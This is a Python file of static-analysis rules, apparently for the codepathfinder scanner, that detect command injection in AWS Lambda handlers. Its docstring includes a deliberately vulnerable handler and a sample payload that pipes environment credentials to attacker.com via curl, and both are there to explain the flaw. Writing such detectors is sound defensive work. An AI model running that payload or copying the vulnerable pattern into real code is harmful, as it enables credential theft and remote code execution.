"""
Python AWS Lambda Command Injection Rules

PYTHON-LAMBDA-SEC-001: Command Injection via os.system()
PYTHON-LAMBDA-SEC-002: Command Injection via subprocess
PYTHON-LAMBDA-SEC-003: Command Injection via os.spawn*()
PYTHON-LAMBDA-SEC-004: Command Injection via asyncio subprocess shell
PYTHON-LAMBDA-SEC-005: Command Injection via asyncio subprocess exec
PYTHON-LAMBDA-SEC-006: Command Injection via asyncio loop.subprocess_exec

Security Impact: CRITICAL
CWE: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
OWASP: A03:2021 - Injection

DESCRIPTION:
These rules detect OS command injection vulnerabilities in AWS Lambda functions where
untrusted event data flows into command execution functions. Lambda functions receive
event data from various AWS triggers (API Gateway, S3, SNS, SQS, DynamoDB Streams)
and this data is fully attacker-controllable in many scenarios.

Detected command execution sinks:
- **os.system() / os.popen()**: Execute shell commands as strings, fully vulnerable to injection
- **subprocess.call/run/Popen**: Safe with list arguments, vulnerable with shell=True and strings
- **os.spawn*()**: Family of process spawning functions (spawnl, spawnle, spawnlp, etc.)
- **asyncio.create_subprocess_shell()**: Async shell command execution
- **asyncio.create_subprocess_exec()**: Async process execution
- **loop.subprocess_exec()**: Event loop-level subprocess execution

SECURITY IMPLICATIONS:

**1. Remote Code Execution (RCE)**:
An attacker who controls Lambda event data can inject shell metacharacters (;, |, &&, ``,
$()) to execute arbitrary commands within the Lambda execution environment.

**2. AWS Credential Theft**:
Lambda functions run with IAM role credentials accessible via environment variables
(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN). Command injection allows
attackers to exfiltrate these credentials and access other AWS resources.

**3. Data Exfiltration**:
Attackers can read the Lambda function code, environment variables, /tmp contents, and
any data accessible to the function's IAM role, then exfiltrate via DNS or HTTP.

**4. Lateral Movement**:
With stolen IAM credentials, attackers can pivot to other AWS services (S3, DynamoDB,
other Lambda functions) accessible to the compromised role.

VULNERABLE EXAMPLE:
```python
import os
import subprocess

def lambda_handler(event, context):
    # VULNERABLE: Event data directly in os.system()
    filename = event.get('filename', '')
    os.system(f'ls -la /tmp/{filename}')  # Command injection!

    # VULNERABLE: Event data in subprocess with shell=True
    user_input = event['queryStringParameters']['cmd']
    result = subprocess.check_output(
        f'echo {user_input}',
        shell=True  # Dangerous with user input!
    )

    # VULNERABLE: Event data in os.popen()
    path = event.get('path', '')
    output = os.popen(f'cat {path}').read()

    return {'statusCode': 200, 'body': output}

# Attack payload:
# event = {"filename": "; curl attacker.com/steal?creds=$(env | base64)"}
```

SECURE EXAMPLE:
```python
import subprocess
import shlex
import os

def lambda_handler(event, context):
    # SECURE: Use subprocess with list arguments (no shell interpretation)
    filename = event.get('filename', '')
    result = subprocess.run(
        ['ls', '-la', f'/tmp/{filename}'],  # List args = no shell injection
        capture_output=True, text=True
    )

    # SECURE: Use shlex.quote() for shell commands when unavoidable
    user_input = event.get('name', '')
    safe_input = shlex.quote(user_input)
    result = subprocess.run(
        f'echo {safe_input}',
        shell=True, capture_output=True, text=True
    )

    # SECURE: Validate and sanitize input
    import re
    filename = event.get('filename', '')
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        return {'statusCode': 400, 'body': 'Invalid filename'}

    result = subprocess.run(
        ['cat', f'/tmp/{filename}'],
        capture_output=True, text=True
    )

    return {'statusCode': 200, 'body': result.stdout}
```

DETECTION AND PREVENTION:
```bash
# Scan for Lambda command injection
pathfinder scan --project . --ruleset cpf/python/PYTHON-LAMBDA-SEC-001

# CI/CD integration
- name: Check Lambda command injection
  run: pathfinder ci --project . --ruleset cpf/python/aws_lambda
```

**Code Review Checklist**:
- [ ] No os.system() or os.popen() with event-derived data
- [ ] subprocess calls use list arguments, not shell strings
- [ ] shell=True is never used with user-controlled input
- [ ] shlex.quote() applied when shell execution is unavoidable
- [ ] Input validation with allowlists (regex, enum checks) before command use
- [ ] Lambda IAM role follows least privilege principle

COMPLIANCE:
- OWASP A03:2021: Injection
- CWE-78: OS Command Injection
- AWS Lambda Security Best Practices
- SANS Top 25: CWE-78 ranked as critical vulnerability

REFERENCES:
- CWE-78: OS Command Injection (https://cwe.mitre.org/data/definitions/78.html)
- OWASP Command Injection (https://owasp.org/www-community/attacks/Command_Injection)
- AWS Lambda Security Best Practices (https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html)
- OWASP Injection Prevention Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
"""

from rules.python_decorators import python_rule
from codepathfinder import calls, flows, QueryType
from codepathfinder.presets import PropagationPresets


class OSModule(QueryType):
    fqns = ["os"]


class SubprocessModule(QueryType):
    fqns = ["subprocess"]


class AsyncioModule(QueryType):
    fqns = ["asyncio"]


# Lambda event sources — event dict is the primary untrusted input
_LAMBDA_SOURCES = [
    calls("event.get"),
    calls("event.items"),
    calls("event.values"),
    calls("event.keys"),
    calls("*.get"),
]


@python_rule(
    id="PYTHON-LAMBDA-SEC-001",
    name="Lambda Command Injection via os.system()",
    severity="CRITICAL",
    category="aws_lambda",
    cwe="CWE-78",
    tags="python,aws,lambda,command-injection,os-system,owasp-a03,cwe-78",
    message="Lambda event data flows to os.system(). Use subprocess with list args instead.",
    owasp="A03:2021",
)
def detect_lambda_os_system():
    """Detects Lambda event data flowing to os.system()/os.popen()."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            OSModule.method("system", "popen", "popen2", "popen3", "popen4"),
        ],
        sanitized_by=[
            calls("shlex.quote"),
            calls("shlex.split"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-002",
    name="Lambda Command Injection via subprocess",
    severity="CRITICAL",
    category="aws_lambda",
    cwe="CWE-78",
    tags="python,aws,lambda,command-injection,subprocess,owasp-a03,cwe-78",
    message="Lambda event data flows to subprocess call. Use shlex.quote() or list args.",
    owasp="A03:2021",
)
def detect_lambda_subprocess():
    """Detects Lambda event data flowing to subprocess functions."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            SubprocessModule.method("call", "check_call", "check_output",
                                    "run", "Popen", "getoutput", "getstatusoutput"),
        ],
        sanitized_by=[
            calls("shlex.quote"),
            calls("shlex.split"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-003",
    name="Lambda Command Injection via os.spawn*()",
    severity="CRITICAL",
    category="aws_lambda",
    cwe="CWE-78",
    tags="python,aws,lambda,command-injection,os-spawn,owasp-a03,cwe-78",
    message="Lambda event data flows to os.spawn*(). Use subprocess with list args instead.",
    owasp="A03:2021",
)
def detect_lambda_os_spawn():
    """Detects Lambda event data flowing to os.spawn*() functions."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            OSModule.method("spawnl", "spawnle", "spawnlp", "spawnlpe",
                            "spawnv", "spawnve", "spawnvp", "spawnvpe"),
        ],
        sanitized_by=[
            calls("shlex.quote"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-004",
    name="Lambda Command Injection via asyncio shell",
    severity="CRITICAL",
    category="aws_lambda",
    cwe="CWE-78",
    tags="python,aws,lambda,command-injection,asyncio,owasp-a03,cwe-78",
    message="Lambda event data flows to asyncio.create_subprocess_shell().",
    owasp="A03:2021",
)
def detect_lambda_asyncio_shell():
    """Detects Lambda event data flowing to asyncio shell subprocess."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            AsyncioModule.method("create_subprocess_shell"),
        ],
        sanitized_by=[
            calls("shlex.quote"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-005",
    name="Lambda Command Injection via asyncio exec",
    severity="HIGH",
    category="aws_lambda",
    cwe="CWE-78",
    tags="python,aws,lambda,command-injection,asyncio,owasp-a03,cwe-78",
    message="Lambda event data flows to asyncio.create_subprocess_exec().",
    owasp="A03:2021",
)
def detect_lambda_asyncio_exec():
    """Detects Lambda event data flowing to asyncio exec subprocess."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            AsyncioModule.method("create_subprocess_exec"),
        ],
        sanitized_by=[
            calls("shlex.quote"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-006",
    name="Lambda Command Injection via loop.subprocess_exec",
    severity="HIGH",
    category="aws_lambda",
    cwe="CWE-78",
    tags="python,aws,lambda,command-injection,asyncio-loop,owasp-a03,cwe-78",
    message="Lambda event data flows to loop.subprocess_exec().",
    owasp="A03:2021",
)
def detect_lambda_loop_subprocess():
    """Detects Lambda event data flowing to event loop subprocess_exec."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            calls("*.subprocess_exec"),
        ],
        sanitized_by=[
            calls("shlex.quote"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )
